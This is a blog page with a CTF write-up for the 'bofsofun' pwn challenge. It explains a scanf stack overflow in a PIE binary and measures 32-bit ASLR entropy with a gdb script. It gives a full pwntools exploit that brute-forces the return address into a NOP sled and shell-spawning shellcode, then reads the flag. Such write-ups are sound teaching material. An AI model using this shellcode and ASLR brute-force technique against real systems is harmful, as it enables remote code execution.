<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>TW.edu CTF 2015: bofsofun (pwn 150) | Isaac's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives" class="sidebar-nav-item">Archives</a><a href="/about" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>TW.edu CTF 2015: bofsofun (pwn 150)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2016-02-06</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/ASLR/">ASLR</a>/<a class="post-tag-link" href="/tags/TW-edu-CTF/">TW.edu CTF</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Do you know Stack overflow attack ?<br>nc pwning.pwnable.tw 48879<br><a href="/2016/02/06/bofsofun/bofsofun" title="binary">binary</a></p>
</blockquote>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight x86asm"><figcaption><span>bofsofun</span></figcaption><table><tr><td class="code"><pre><span class="hljs-symbol">.text:</span><span class="hljs-number">0x823</span>    <span class="hljs-keyword">lea</span>   <span class="hljs-built_in">eax</span>, (aBufferOverflow - <span class="hljs-number">1FB0h</span>)[<span class="hljs-built_in">ebx</span>] <span class="hljs-comment">; "Buffer overflow is so fun"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x829</span>    <span class="hljs-keyword">mov</span>   [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span>      <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x82C</span>    <span class="hljs-keyword">call</span>  _puts<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x831</span>    <span class="hljs-keyword">lea</span>   <span class="hljs-built_in">eax</span>, (aEnterYourMagic - <span class="hljs-number">1FB0h</span>)[<span class="hljs-built_in">ebx</span>] <span class="hljs-comment">; "Enter your magic :"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x837</span>    <span class="hljs-keyword">mov</span>   [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span>      <span class="hljs-comment">; format</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x83A</span>    <span class="hljs-keyword">call</span>  _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x83F</span>    <span class="hljs-keyword">lea</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span>+<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x843</span>    <span class="hljs-keyword">mov</span>   [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x847</span>    <span class="hljs-keyword">lea</span>   <span class="hljs-built_in">eax</span>, (aS - <span class="hljs-number">1FB0h</span>)[<span class="hljs-built_in">ebx</span>] <span class="hljs-comment">; "%s"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x84D</span>    <span class="hljs-keyword">mov</span>   [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x850</span>    <span class="hljs-keyword">call</span>  ___isoc99_scanf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x855</span>    <span class="hljs-keyword">lea</span>   <span class="hljs-built_in">eax</span>, (aHappyNewYear - <span class="hljs-number">1FB0h</span>)[<span class="hljs-built_in">ebx</span>] <span class="hljs-comment">; "\nHappy New Year !!"</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x85B</span>    <span class="hljs-keyword">mov</span>   [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span>      <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0x85E</span>    <span class="hljs-keyword">call</span>  _puts<br></pre></td></tr></table></figure>
<p>There is a straightforward buffer overflow bug of <code>scanf(&quot;%s&quot;)</code> at <code>0x850</code>, and as we can see from the output of <code>checksec</code> below, the <code>NX</code> and <code>STACK CANARY</code> is disabled. It seems that we can insert the shellcode and jump to it. However, also shown in the output of <code>checksec</code>, this is a <strong>PIE enabled</strong> program. That is, with only one time buffer overflow, we can’t decide where the shellcode or any other portion of the program are located.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre>$ checksec --file bofsofun<br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE<br>Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   No      0               1       bofsofun<br></pre></td></tr></table></figure>
<p>To deal with this problem, I adopt the brute force attack which makes use of the low entropy of ASLR on 32-bit systems. I choose a possible address of shellcode and run the exploit repeatedly until it successfully return to the shellcode. This <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">wiki</a> page has the information needed for this exploit. According to it, Linux supplies only 19 bits of stack entropy on a period of 16 bytes. It is also verified by <code>random_bits.py</code>, the gdb script which runs the program 20 times to exam the randomness of the address of input buffer where I will put my shellcode.</p>
<figure class="highlight python"><figcaption><span>random_bits.py</span><a href="/2016/02/06/bofsofun/random_bits.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br></pre></td><td class="code"><pre>gdb.execute(<span class="hljs-string">'b *main+58'</span>, to_string=<span class="hljs-keyword">True</span>)<br>gdb.execute(<span class="hljs-string">'set disable-randomization off'</span>)<br><br>address = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>):<br>    gdb.execute(<span class="hljs-string">'r &gt; /dev/null'</span>, to_string = <span class="hljs-keyword">True</span>)<br>    <span class="hljs-comment"># Read the value of eax, which contains the address of input buffer</span><br>    b = bin(int(str(gdb.parse_and_eval(<span class="hljs-string">'$eax'</span>)), <span class="hljs-number">16</span>))<br>    address.append(b[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">print</span> b<br><br><span class="hljs-comment"># Find out the highest and lowest bits that vary every time</span><br>high = <span class="hljs-number">-1</span><br><span class="hljs-keyword">for</span> i, n_bit <span class="hljs-keyword">in</span> enumerate(zip(*address)):<br>    <span class="hljs-keyword">if</span> len(set(n_bit)) &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> high == <span class="hljs-number">-1</span>:<br>            high = i<br>        low = i<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">"Random range: [{}, {}], {} bits"</span>.format(high, low, low - high + <span class="hljs-number">1</span>)<br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre>gdb-peda$ source random_bits.py <br>0b11111111100110111111000101100000<br>0b11111111111001100011001110000000<br>0b11111111100101100111111101000000<br>0b11111111101010110010011110010000<br>0b11111111101000100000010000100000<br>0b11111111111101011101011010100000<br>0b11111111100101011001000000110000<br>0b11111111101001100101010000010000<br>0b11111111111110000110111101000000<br>0b11111111101111011111011111110000<br>0b11111111110010110010100110010000<br>0b11111111101000001110001111110000<br>0b11111111111010010000001110000000<br>0b11111111101100101010101011000000<br>0b11111111101100110100001100110000<br>0b11111111101000100110000010000000<br>0b11111111110100001000110011110000<br>0b11111111111010110000101110110000<br>0b11111111111111001101010011010000<br>0b11111111100110001001000011000000<br>Random range: [9, 27], 19 bits<br></pre></td></tr></table></figure>
<p>To further reduce the entropy, I also adopt a 2048-bit nop sled. Under this situation, the probability of jumping to the shellcode is theoretically $\frac{2^{11} \div 2^4}{2^{19}} = \frac{1}{4096} \approx 0.02\%$, which is also consistent to the result of real exploitation.</p>
<figure class="highlight python"><figcaption><span>bofsofun_exp.py</span><a href="/2016/02/06/bofsofun/bofsofun_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">from</span> pwnlib.util.packing <span class="hljs-keyword">import</span> p32<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>random_addr = <span class="hljs-number">0xff89e360</span><br>no_whitespace_shellcode = <span class="hljs-string">'\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68'</span> \<br>                          <span class="hljs-string">'\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04'</span> \<br>                          <span class="hljs-string">'\xcd\x80\xc0\xe8\x03\xcd\x80'</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">print</span> i<br>    <span class="hljs-keyword">try</span>:<br>        r = remote(<span class="hljs-string">'pwning.pwnable.tw'</span>, <span class="hljs-number">48879</span>)<br>        <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>        r.sendline(<span class="hljs-string">'A'</span>*<span class="hljs-number">92</span> + p32(random_addr) + <span class="hljs-string">'\x90'</span>*<span class="hljs-number">2048</span> + no_whitespace_shellcode)<br>        <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'!!\n'</span>)<br>        sleep(<span class="hljs-number">0.3</span>)<br>        r.sendline(<span class="hljs-string">'cat /home/bofsofun/flag'</span>)<br>        sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">print</span> r.recv()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    r.shutdown()<br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: <code>CTF{4Slr_!S_w34kn3Ss_0n_x86_3z}</code></p>
</blockquote>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>At first, I thought that the success rate is $\frac{2^{11}}{2^{19}} = \frac{1}{256} \approx 0.4\%$ because I didn’t consider the fact that the lowest 4 bits are not included in the 19-bit randomness. In short, only every extra $2^4$ of nop sled could effectively increase $\frac{1}{2^{19}}$  of success rate. Therefore, we should divide the length of nop sled by $2^4$, and the final success rate is $\frac{2^{11} \div 2^4}{2^{19}} = \frac{1}{4096} \approx 0.02\%$ as shown above.</p>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2016/02/06/bofsofun/';
var disqus_title = 'TW.edu CTF 2015: bofsofun (pwn 150)';
var disqus_url = 'http://poning.me/2016/02/06/bofsofun/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2016 <a href="/" rel="nofollow">Isaac's Blog</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});</script>
<!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->

<!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
</body></html>